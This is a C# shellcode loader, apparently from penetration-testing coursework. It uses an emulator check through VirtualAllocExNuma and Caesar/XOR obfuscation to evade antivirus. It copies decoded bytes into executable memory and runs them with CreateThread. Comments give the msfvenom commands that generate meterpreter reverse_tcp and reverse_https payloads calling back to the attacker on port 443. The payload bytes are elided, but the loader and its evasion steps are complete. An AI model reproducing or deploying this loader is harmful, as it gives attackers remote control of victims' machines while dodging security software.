using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Xml.XPath;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            //Sleep
            //DateTime t1 = DateTime.Now;
            //Sleep(2000);
            //double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            //if (t2 < 1.5)
            //{
            //    return;
            //}

            //Non-Emulated API
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            //msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp
            //msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp
            byte[] buf = new byte[510] { 0xff, ...};

            // Caesar decoding
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((buf[i] + (256 - 3)) % 256);
            }


            //caesar encoding
            //byte[] encoded = new byte[buf.Length];
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    encoded[i] = (byte)(((uint)buf[i] + 6) & 0xFF);
            //}
            //StringBuilder hex = new StringBuilder(encoded.Length * 2);
            //foreach (byte b in encoded)
            //{
            //    hex.AppendFormat("0x{0:x2}, ", b);
            //}
            //Console.WriteLine("The payload is: " + hex.ToString());

            //Caesar Decoding
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 6) & 0xFF);
            //}

            //XOR encoding
            //byte[] encoded = new byte[buf.Length];
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    encoded[i] = (byte)(buf[i] ^ 0xAA);
            //}
            //StringBuilder hex = new StringBuilder(encoded.Length * 2);
            //foreach (byte b in encoded)
            //{
            //    hex.AppendFormat("0x{0:x2}, ", b);
            //}
            //Console.WriteLine("The payload is: " + hex.ToString());

            //XOR decoding
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(buf[i] ^ 0xAA);
            //}


            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
